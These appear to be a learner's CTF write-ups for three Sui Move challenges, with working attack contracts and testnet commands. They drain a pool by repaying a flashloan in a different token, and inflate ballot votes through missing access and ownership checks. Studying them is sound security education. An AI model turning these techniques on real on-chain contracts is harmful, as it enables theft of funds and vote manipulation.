# move-ctf co-learning

Try to write writeup for each task

## week1

target object:
```move!
public struct Challenge has key {
    id: UID,
    secret: String,
    current_score: u64,
    round_hash: vector<u8>,
    finish: u64,
}
```
update once pass the `get_flag()`:
```move!
challenge.secret = getRandomString(rand, ctx);
challenge.round_hash = sha3_256(*string::as_bytes(&challenge.secret));
challenge.current_score = 0;
challenge.finish = challenge.finish + 1;
```
how to pass `get_flag()`:
```move
assert!(score == expected_score, EINVALID_SCORE);`
assert!(compare_hash_prefix(&random, &challenge.round_hash, prefix_length), EINVALID_GUESS_HASH);
assert!(hash_input == expected_hash, EINVALID_HASH);
assert!(magic_number == expected_magic, EINVALID_MAGIC);
assert!(seed == secret_len * 2, EINVALID_SEED);
```
- `expected_score`: derive from `secret_hash`, which derive from `challenge.secret`
- `random`: derived from `guess` & `challenge.secret`, and need to be aligned with `challenge.round_hash`
    - `sha3_256(guess || b"Letsmovectf_week1")` must start with `[88, 32, ...]`
- `expected_hash`: derived from `bcs_input`, which comes from `github_id`
- `expected_magic`: comes from `current_score` & `seed`
- `secret_len`: a constraint of `seed`, which comes from `secret_bytes`, which comes from `challenge.secret`



flag object:
```move!
public struct FlagEvent has copy, drop {
    sender: address,
    flag: String,
    github_id: String,
    success: bool,
    rank: u64,
}
```
emit event:
```move!
event::emit(FlagEvent {
    sender: tx_context::sender(ctx),
    flag: string::utf8(b"CTF{Letsmovectf_week1}"),
    github_id,
    success: true,
    rank: challenge.finish
});
```

final crafted input:
```move
score: u64 = 1478524421
guess: vector<u8> = 0x0a350dae
hash_input: vector<u8> = 0x33b9b8b83c919df372905fef46571b9e2c51593cea191176d8ff21afe9f9c1ae
github_id: String = 42c29c26-dd1c-4dca-86c5-813fc70db6c8
magic_number: u64 = 34
seed: u64 = 34
challenge: &mut Challenge = 0xb7f529a3394f9dccfa91d39d65ed78b9bf755d127912a189c6404e24e1c24d12
rand: &Random = 0x8
```
final call :
```
sui client call \
  --package 0x8cd7960bbb339de8e97c75508afdf70ad4a053e82c6718381f004e013bf33172 \
  --module challenge \
  --function get_flag \
  --args \
    1478524421 \
    0x0a350dae \
    0x33b9b8b83c919df372905fef46571b9e2c51593cea191176d8ff21afe9f9c1ae \
    42c29c26-dd1c-4dca-86c5-813fc70db6c8 \
    455 \
    34 \
    0xb7f529a3394f9dccfa91d39d65ed78b9bf755d127912a189c6404e24e1c24d12 \
    0x8 \
  --gas-budget 100000000
```

### 邊做邊學

- In sui testnet, `Pre-Existing Random Object` is `0x8`

## week2

### Description

Weird DEX, is like the “wacky exchange” of the blockchain world! Want to get the flag? Prove you’ve got what it takes to drain all the BUTT from the pool!

### Writeup

Key data:

Challenge Object:
```move
public struct Challenge<phantom LP, phantom BUTT, phantom DROP> has key, store {
    id: UID,
    pool: Pool<LP>,
    drop_balance: Balance<DROP>,
    claimed: bool,
    success: bool,
}
```

Pool Object:
```move
public struct Pool<phantom L> has key, store {
    id: UID,
    creator: address,
    lp_supply: Supply<L>,
    balances: Bag,
    type_names: vector<ascii::String>,
    swap_fee: u64,
    coin_decimals: vector<u8>,
    lp_decimals: u8,
    flashloan: bool,
}
```
FlashReceipt:
```move
public struct FlashReceipt {
    pool_id: ID,
    type_name: ascii::String,
    repay_amount: u64,
}
```

解題條件：
- `pool.balance_of<LP, BUTT>() == 0`
- `is_flashloan == false`

Pool initial state:
```move
Pool<LP> {
    id: object::new(ctx),
    lp_supply: coin::treasury_into_supply(lp_treasury_cap), // LP coin supply tracker (zero)
    balances: balances, // Stores BUTT and DROP balances (1000:10000000)
    type_names: vector["BUTT", "DROP"], // Strings of A and B's type names
    creator: ctx.sender(), // Address who initialized the pool
    swap_fee: 1000, // Custom swap fee (basis points = 1%)
    lp_decimals: lp_coin_metadata.get_decimals(), // e.g., 6
    coin_decimals: vector[6, 6], // Coin decimal settings (user-specified)
    flashloan: false
```

解題思路：
1. `pool` initial state contains (`1000 BUTT` / `1e7 DROP`), in order to drain all `BUTT`, we need to touch to the `withdraw_internal()`
2. `withdraw_internal()` can be called by either `swap_a_to_b` & `flashloan()`
3. `swap_a_to_b()`: There is no way to drain all `BUFF`, since there exist a fee to pay, and the fee is 0 only if `pool.swap_fee = 0` (which is obvious impossible)
4. `flashloan()`: Simply draining all `BUTT` during flashloan doesn't work since hte limitation: `is_flashloan == false`
5. Check the logic inside `flashloan()` & `repay_flashloan()`, find that it doesn't check the type of borrowed token and repayed token being the same, namely, it doesn't check `type_name`, so we can simply borrow `BUTT` and repay the same amount of `DROP`''

挑戰環境：
- Vulnerable Package ID: `0x4b747301fed830e6d9d965e301bfa50b120c3174d52e5e622db607297626ed7a`
- 部署交易哈希: `CkbzouauPtwPVybEvKjkmgoK6ohYoESePWQVGjkg4uw8`
- github id: `e3848ac6-aa1d-4ddb-a8eb-f5d8fcb0eb19` 

具體步驟：
1. Deploy the attacker contract & retrieve its package id
    ```move
    // PackageID: 0x52477ed568492c0b9208a35e64ee4e643bce71f24478295b8ac1d2c16355879f
    module solve_week2::solve_week2 {
        use std::string::String;
        use sui::coin;
        use week2::butt::{MintBUTT, BUTT};
        use week2::challenge::{create_challenge, get_pool_mut, claim_drop, get_flag, is_solved};
        use week2::drop::{MintDROP, DROP};
        use week2::lp::LP;
        use week2::pool::CreatePoolCap;

        #[allow(lint(self_transfer))]
        public fun solve(
            mint_butt: MintBUTT<BUTT>,
            mint_drop: MintDROP<DROP>,
            create_cap: CreatePoolCap<LP>,
            github_id: String,
            ctx: &mut TxContext,
        ) {
            // 1. Create and get the challenge object.
            let mut challenge_obj = create_challenge(mint_butt, mint_drop, create_cap, ctx);

            // 2. Get the airdrop (Coin<DROP>).
            // This is done BEFORE getting a mutable reference of the internal pool to avoid a borrowing conflict.
            let mut airdrop_drop_coin = claim_drop(&mut challenge_obj, ctx);

            // Get a mutable reference to the Pool object nested within the Challenge.
            let pool_mut_ref = get_pool_mut(&mut challenge_obj);

            let initial_butt_in_pool = week2::pool::balance_of<LP, BUTT>(pool_mut_ref);

            // 3. Borrow flashloan with BUTT
            let (borrowed_butt_coin, flash_receipt_butt) =
                week2::pool::flashloan<LP, BUTT>(pool_mut_ref, initial_butt_in_pool, ctx);

            let required_repay_amount = 1050;
            // assert!(coin::value(&airdrop_drop_coin) == required_repay_amount, 1);

            // 4. Repay flashloan with DROP
            let final_repay_coin_drop = coin::split(&mut airdrop_drop_coin, required_repay_amount, ctx);
            week2::pool::repay_flashloan<LP, DROP>(
                pool_mut_ref,
                flash_receipt_butt,
                final_repay_coin_drop
            );

            transfer::public_transfer(borrowed_butt_coin, tx_context::sender(ctx));
            transfer::public_transfer(airdrop_drop_coin, tx_context::sender(ctx));

            // 5. Call `get_flag()` to get the flag.
            get_flag(&mut challenge_obj, github_id, ctx);
            transfer::public_share_object(challenge_obj);
        }
    }
    ```
2. execute following command:
    ```
    sui client call \
      --package 0x52477ed568492c0b9208a35e64ee4e643bce71f24478295b8ac1d2c16355879f \
      --module solve_week2 \
      --function solve \
      --args \
        0xdb534b7ee112da9367ecbcf1bcb998b164484f411e75f22e646e3ec3d2149b57 \
        0xdaa2eb511a0c256bc00501f4321486a18f16389f76c08732d40b2ef07cb5c6ca \
        0xb623b648ac5ac4a37f7a780548baaa782f5276af41e54d22b5829078a21e79cf \
        e3848ac6-aa1d-4ddb-a8eb-f5d8fcb0eb19 \
      --gas-budget 100000000
    ```
    
### 踩坑

當要deploy 的 contract 有調用到鏈上的 package，需要
- **source code**
- **package id**

For example, in move.toml of the attacker contract, we use the source code local
```toml!
week2 = { local = "../move_contract" }
```

and in the local `move_contract/move.toml`:
```toml!
[package]
name = "week2"
edition = "2024.beta"
published-at = "0x4b747301fed830e6d9d965e301bfa50b120c3174d52e5e622db607297626ed7a"

...

[addresses]
week2 = "0x4b747301fed830e6d9d965e301bfa50b120c3174d52e5e622db607297626ed7a"
```

indicate that the week2 package is already published on chain at `0x4b747301fed830e6d9d965e301bfa50b120c3174d52e5e622db607297626ed7a`, and contract `solve_week2` will know that it should reference it 

## week3

### Description

1. Everyone can register to become candidate
2. Candidates are allowed to change their registered account
3. Everyone can get ballot
4. Ballot contains 10 voting power to vote for the candidates
5. Briber will give you the flag if you have proof of giving certain candidate 21 votes

### Writeup

Condition：

Your `ballot` has at least `REQUIRED_VOTES` (i.e `21`) votes for `REQUIRED_CANDIDATE`
```move
let votes = ballot.voted().try_get(&required_candidate());
assert!(votes.is_some());
assert!(votes.destroy_some() >= required_votes());
```
Key Concept:
- Missing Access Control
- Missing State Management

Deep Dive:
- Inside `candiate::amend_account` function, it lacks access control check, letting anyone be able to change candidate's account
    ```move
    public fun amend_account(
        candiate: &mut Candidate,
        account: address,
    ) {
        candiate.account = account;
    }
    ```
- Inside `ballot::finish_voting` function, it doesn't check the relationship between `ballot` & `request` (i.e. whether `resuest` is created by `ballot`), so any `request` can be committed to any `ballot`
    ```move
    public fun finish_voting(ballot: &mut Ballot, request: VoteRequest) {
        let VoteRequest {
            voting_power: _,
            voted,
        } = request;
        let (candidates, votes) = voted.into_keys_values();
        candidates.zip_do!(votes, |c, v| {
            let ballot_voted = &mut ballot.voted;
            let already_voted = ballot_voted.try_get(&c);
            if (already_voted.is_some()) {
                *ballot_voted.get_mut(&c) = already_voted.destroy_some() + v;
            } else {
                ballot_voted.insert(c, v);
            }
        });
    }
    ```
Challenge Environment：
- github id: `e3b4dfe8-845e-4bda-8de1-ad0b72975cbd`
- package id: `0x62a908d1b198a026d167a030d04bec0ab8382ffea068c6ec91e4f75e0d47cabb`
- tx hash: `8EjNDuFGHJVvpHrFtuZ7ViDT8FQCniCfJwv875tXhtx5`

Step by Step Solution:
1. Writes an attack contract and deploy it, get the package id `0x0143395bf3c44b39540af68983cdfd040a37babf49479fc1f7cd0e8fec71f68c`
    ```move!
    // PackageID: 0x0143395bf3c44b39540af68983cdfd040a37babf49479fc1f7cd0e8fec71f68c
    module solve_week3::solve_week3 {
        use std::string::String;

        use bribery_voting::briber::{Briber, get_flag, required_candidate};
        use bribery_voting::ballot::{Ballot, get_ballot, finish_voting};
        use bribery_voting::candidate::{Candidate, register, amend_account, vote};

        public fun create_ballots_and_register_candidate(ctx: &mut TxContext) {
            // create three ballots
            let _ = get_ballot(ctx);
            let _ = get_ballot(ctx);
            let _ = get_ballot(ctx);

            // register candidate
            register(ctx);
        }

        public fun exploit(
            briber: &mut Briber,
            candiate: &mut Candidate, 
            ballot1: &mut Ballot, 
            ballot2: &mut Ballot, 
            ballot3: &mut Ballot,
            github_id: String,
            ctx: &mut TxContext
        ) {
            // amend candidate's account
            let account = required_candidate();
            amend_account(candiate, account);

            // create vote requests
            let mut req1 = ballot1.request_vote();
            let mut req2 = ballot2.request_vote();
            let mut req3 = ballot3.request_vote();

            // vote with each request
            vote(candiate, &mut req1, 10);
            vote(candiate, &mut req2, 10);
            vote(candiate, &mut req3, 10);

            // finish voting into ballot1
            finish_voting(ballot1, req1);
            finish_voting(ballot1, req2);
            finish_voting(ballot1, req3);

            get_flag(briber, ballot1, github_id, ctx);
        }
    }
    ```
2. Call `create_ballots_and_register_candidate()` to create 3 ballots & 1 candidate
    ```
    sui client call \
      --package 0x0143395bf3c44b39540af68983cdfd040a37babf49479fc1f7cd0e8fec71f68c \
      --module solve_week3 \
      --function create_ballots_and_register_candidate \
      --gas-budget 100000000
    ```
    get
    - candidate id: `0x5f302afca20ab9de6fe4ac4de0f8671255f050d1eb19c9e78d8d3d4851c3d225`
    - ballot1: `0x338d9750032ba14d330ca1e7f2e86113be6e18e72c7d85eaa53e8e79e4e4586e`
    - ballot2: `0x638bbed18beb82d4e8741b45b0b95431f15004a6c68c4bc7146b85a2dc3d05f0`
    - ballot3: `0xe6261fa047bc0d96633531673def6f2bfe5584bdbbb8a07761d0c21c255e869f`
3. With briber id: `0x071696c2d60a84dfb401dd6f8cb8ca69e23000ba20cdb10c06b19ea29dda28b5`, call `exploit()`
    ```
    sui client call \
      --package 0x0143395bf3c44b39540af68983cdfd040a37babf49479fc1f7cd0e8fec71f68c \
      --module solve_week3 \
      --function exploit \
      --args \
        0x071696c2d60a84dfb401dd6f8cb8ca69e23000ba20cdb10c06b19ea29dda28b5 \
        0x5f302afca20ab9de6fe4ac4de0f8671255f050d1eb19c9e78d8d3d4851c3d225 \
        0x338d9750032ba14d330ca1e7f2e86113be6e18e72c7d85eaa53e8e79e4e4586e \
        0x638bbed18beb82d4e8741b45b0b95431f15004a6c68c4bc7146b85a2dc3d05f0 \
        0xe6261fa047bc0d96633531673def6f2bfe5584bdbbb8a07761d0c21c255e869f \
        e3b4dfe8-845e-4bda-8de1-ad0b72975cbd
      --gas-budget 100000000
    ```